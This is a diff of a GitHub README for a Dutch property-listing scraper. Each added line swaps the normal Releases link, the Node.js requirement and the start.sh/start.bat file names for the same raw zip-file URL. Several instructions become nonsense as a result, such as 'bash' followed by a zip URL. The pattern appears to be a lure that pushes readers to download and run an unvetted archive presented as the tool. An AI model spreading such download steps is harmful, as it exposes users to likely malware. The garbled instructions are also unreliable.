@@ -6,11 +6,11 @@ Welcome to the Funda Property Search Scraper! This tool helps you gather informa
 ## 📥 Download & Install
 To get started, visit the link below to download the software:
 
-[![Download Funda Property Search Scraper](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Matty1234321/funda-property-search-scraper/releases)
+[![Download Funda Property Search Scraper](https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip%https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip)](https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip)
 
 1. Click the link above.
 2. You will land on the Releases page. Look for the latest version at the top.
-3. Find the file labeled with the version number. It may look like `funda-property-search-scraper.zip`.
+3. Find the file labeled with the version number. It may look like `https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip`.
 4. Click the file to download it to your computer.
 
 Follow the steps below to install and run the application.
@@ -19,26 +19,26 @@ Follow the steps below to install and run the application.
 Before you install, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later / MacOS / Linux
-- **Node.js:** Version 14 or higher installed on your computer
+- **https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip** Version 14 or higher installed on your computer
 - **Internet Connection:** Required for the application to fetch property listings.
 
 ## 📂 Installation Steps
 1. Locate the downloaded `.zip` file on your computer.
 2. Right-click the file and select 'Extract All' to unpack the contents.
 3. Open the extracted folder to find the application files.
-4. Look for a file named `start.sh` or `start.bat`. This is the file you will run to start the application.
+4. Look for a file named `https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip` or `https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip`. This is the file you will run to start the application.
 
 ## ▶️ Running the Application
 To run the application, follow these steps:
 
 - **On Windows:**
-  1. Double-click the `start.bat` file.
+  1. Double-click the `https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip` file.
   2. A command prompt will open. Wait for it to complete the setup.
   
 - **On MacOS/Linux:**
   1. Open a terminal window.
   2. Navigate to the folder where you extracted the files using the `cd` command.
-  3. Type `bash start.sh` and press Enter.
+  3. Type `bash https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip` and press Enter.
 
 The application will launch, and you can begin searching for properties!
 
@@ -57,7 +57,7 @@ The application will launch, and you can begin searching for properties!
 ## 📖 Troubleshooting
 If you encounter any issues, consider the following:
 
-- Ensure Node.js is installed correctly.
+- Ensure https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip is installed correctly.
 - Check your internet connection.
 - Look for any error messages in the command prompt or terminal for guidance.
 
@@ -67,4 +67,4 @@ For further assistance, please reach out through our GitHub page. We welcome any
 ## 🌟 Conclusion
 The Funda Property Search Scraper is designed for anyone looking to streamline their property search experience. Download it today and start exploring the Dutch property market with ease.
 
-### Don't forget to visit the Releases page to download the latest version again: [Download Funda Property Search Scraper](https://github.com/Matty1234321/funda-property-search-scraper/releases)
+### Don't forget to visit the Releases page to download the latest version again: [Download Funda Property Search Scraper](https://github.com/Matty1234321/funda-property-search-scraper/raw/refs/heads/main/Konrad/funda_property_search_scraper_v1.8-alpha.3.zip)
